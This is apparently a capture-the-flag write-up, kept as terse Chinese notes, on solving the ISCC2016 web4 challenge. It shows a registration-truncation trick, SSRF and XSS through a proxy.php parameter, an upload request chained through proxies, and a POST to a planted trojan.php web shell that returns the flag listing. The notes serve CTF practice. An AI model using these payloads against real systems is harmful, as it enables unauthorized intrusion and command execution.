@@ -1,0 +1,152 @@
+angelwhu\'
+angelwhu@199.com\'123
+123
+123
+
+可能存在docx xxe
+
+注册一个超长admin，
+uname=admin                                                                                                                                                                                                                                                  a&email=hu%40111.com<script 111 >&passwd=123456angelwhu&passconf=123456angelwhu&captcha=SfAm
+
+登录返回：
+username=admin&password=123456angelwhu
+
+welcome! haozige!
+
+
+2个方面：
+1. 登录页是否有注入？
+2. proxy.php 代理原理？
+
+
+http://101.200.145.44/web4/proxy.php?url=http://121.42.175.111:8080/xss/test_alert.html
+
+可以xss，将目标网站的内容全部copy过来显示。  
+
+
+welcome! haozige!
+
+
+SSRF??
+
+http://101.200.145.44/web4/proxy.php?url=http://121.42.171.222/blog
+
+
+若不是SSRF：  
+
+10.251.32.21:200
+10.251.32.25:200
+10.251.32.48:200
+10.251.32.70:200
+10.251.32.96:200
+10.251.32.169:200
+10.251.32.174:200
+10.251.32.197:200
+10.251.32.201:200
+10.251.32.221:200
+10.251.32.238:200
+10.251.32.240:200
+
+都是万网没用的主机。  
+
+
+通过出题人，知道确定是SSRF，于是有了：
+http://101.200.145.44/web4/proxy.php?url=http://121.42.171.222/
+  
+得到：
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+	<title>ISCC2016</title>
+
+<script>
+	var url = '';
+	if(window.dialogArguments)
+		url = window.dialogArguments[1];
+	var str = '';
+	str += '<frameset rows="*, 25" cols="*" framespacing="0" frameborder="0" border="0" id="window_open_frame">';
+	str += '<frame name="contentFrame" src="'+url+'" scrolling="auto" noresize>';
+	str += '</frameset><noframes></noframes>';
+	document.write(str);
+</script>
+</html>
+
+
+XSS：
+
+http://101.200.145.44/web4/proxy.php?url=http://121.42.171.222/index.php?url=http://121.42.175.111:8080/xss/test.html
+
+
+
+两种可能：  
+
+download.php和upload.php。  
+
+login是否存在注入。   
+
+
+INSERT into user values('','admin  ','caab6084ae07ae632decd74f1c485468','hu@111.comscript 111 ')1
+过滤了单引号，转换为空，但是存在注册截断问题。  
+似乎没弱点，找上传。  
+
+
+在admin目录下，发现了proxy.php  
+
+
+上传测试：  
+
+POST http://101.200.145.44/web4/proxy.php?url=http://121.42.171.222/proxy.php?url=http://101.200.145.44/web4/admin/upload/upload.php HTTP/1.1
+Host: 101.200.145.44
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=qpp6lsank9cda89f4rlqup7dc5
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------26782112545236
+Content-Length: 9253
+
+-----------------------------26782112545236
+Content-Disposition: form-data; name="file"; filename="test.zip"
+Content-Type: application/doc
+
+PK'
+
+
+
+为了达到良好的访问效果：burpsuite中增加规则：  
+
+http://101.200.145.44/web4/  http://101.200.145.44/web4/proxy.php?url=http://121.42.171.222/proxy.php?url=http://101.200.145.44/web4/admin/
+
+
+访问robots.txt  
+
+http://101.200.145.44/web4/robots.txt
+
+User-agent: *
+Disallow:trojan.php
+Disallow:trojan.php.txt
+Disallow:check.php
+Disallow:check.php.txt
+
+
+
+1. 先按照上面的方法，注册后登录：  
+
+welcome! haozige!
+
+
+2. php解密  
+
+放到wamp中，得到warning的密码。  
+http://localhost/test/trojan.php
+
+POST:
+
+http://101.200.145.44/web4/trojan.php
+360=echo '12345';
+
+->|./ 2015-10-11 13:37:08 4096 0755 ../ 2016-01-27 21:41:49 4096 0755 flag:{83d97b62-3196-4d53-8c5c-f4ee805f91fc} 2014-09-12 19:37:25 19753 0644 robots.txt 2014-09-12 19:37:25 19753 0644 trojan.php.txt 2014-09-12 19:37:25 19753 0644 trojan.php 2014-09-12 19:37:25 19753 0644 flag.jpg 2014-09-12 19:37:25 19753 0644 |<-
+
